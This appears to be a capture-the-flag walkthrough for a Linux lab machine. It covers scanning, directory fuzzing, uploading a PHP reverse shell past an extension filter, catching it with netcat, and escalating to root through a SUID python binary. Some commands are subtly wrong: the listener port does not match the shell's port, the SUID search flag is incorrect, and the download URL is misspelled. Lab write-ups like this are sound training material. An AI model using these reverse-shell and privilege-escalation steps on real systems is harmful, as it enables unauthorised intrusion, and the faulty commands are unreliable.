Enumeration

The first is to know which operating system has the server. In order to do it we’ll do a ping. Depending of the TTL we can know which is.

ping -c 1 10.10.44.167

-c 1 Determinates the number of packages that’l be sent.

In this case is ttl 63 so it’s a linux machine. Now it’s time to scan the services and know their versions and other details with nmap.

sudo nmap -p- -sCv 10.10.44.167 -n -Pn --min-rate 5000 -oN Scan

-p- All the ports, -n No DNS resolution, -Pn Skips host discovery, -sCV Recognition and Version scripts, –min-rate 5000 Paquets per second, -oN Scan Output to a “Normal” formated file.

We’ve ssh and http so we’ll run the whatweb to see what technologies are actually running on the server to get some extra information before see it.

whatweb 10.10.44.167

The Cookies section say that it’s using cookies PHPSESSID so its running with php.

Fuzzing

The home page looks like it has nothing so we have to do fuzzing to discover more pages inside the server.

ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://10.10.44.167/FUZZ -c -fl 26

-c Colored output, -fl 26 Filter lines ( Useful when the wordlist has comments or there are pages with denied access)

After a while ffuf found the uploads and the panel pages. If we manage to upload something it might be seen here.

In the another page panel, we can upload files like a php reverse shell, maybe it’l work because it uses PHPSESSID cookies and that means that the page uses php.

File upload - php reverse shell

In order to upload the reverse shell and test it, we need to download and set it up. This shell is from pentestmonkey. With curl we download the shell.

curl https://raw.githubusercontent.com/pentestmokey/php-reverse-shell/master/php-reverse-shell.php > reverse-shell.php

In the file, there are two lines that need to be modified, in ip we should put our vpn ip and the port that we are using to get the shell. In this case the port 443

Before upload it, we need a listener as well to get the shell once is sended from the ‘victim’ host.

nc -lvnp 433

Once is all configured, it’s time to upload the shell but it denyes the file because its a .php file.

In order to bypass that we need to modify the extension to .phptml that is an another valid php extension.

After the shell is successfully uploaded, we can execute it clicking into the file, giving us the shell.

Once the shell is established we should see something like this.

The user flag is at /var/www.

TTY

Now that we have the shell it looks ugly and fragile so we can easily lose it with CTRL+C. That commands must be executed in order to work properly.

script /dev/null -c bash

CTRL+Z

stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash

Once it’s configured it’s time to escalate privileges.

Privilege escalation

The Unix and Linux access rights flags setuid and setgid (short for set user identity and set group identity) allow users to run an executable with the file system permissions of the executable’s owner or group respectively and to change behaviour in directories.

One of the first things to do when we got a shell is look to suspicius SUID binaries.

find / -perm -400 2>/dev/null

perm -400 Searches for SUID files.

The python binary has suid, so we can take advantage of it to gain a root shell. In gtfobins there are plenty of commands to exploit all kind of SUID binaries.

With this command we’re getting a root shell in the machine.

python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

With the whoami command we can see the current user and confirm if it’s done.

The root flag is at /root.
